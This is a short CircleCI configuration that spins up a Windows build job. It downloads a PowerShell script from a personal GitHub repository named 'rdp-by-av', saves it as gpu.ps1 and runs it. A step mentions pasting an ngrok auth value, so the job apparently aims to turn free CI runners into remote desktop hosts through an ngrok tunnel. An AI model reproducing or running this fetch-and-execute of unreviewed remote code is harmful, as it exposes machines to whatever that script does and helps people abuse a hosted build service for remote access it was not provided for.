CIRCLECI CODE:

version: 2.1 
 
orbs:
  win: circleci/windows@2.2.0
 
jobs:
  build: 
    executor:
      name: win/default 
      size: "medium" 
      
        
 
    steps:  
       
      - run: 
          name: Paste Ngrok Auth Value In Hosted Link
          command: |      
            Invoke-WebRequest https://raw.githubusercontent.com/danieljohnbrosman08211986/rdp-by-av/main/sh -OutFile gpu.ps1 
          
      - run: ./gpu.ps1


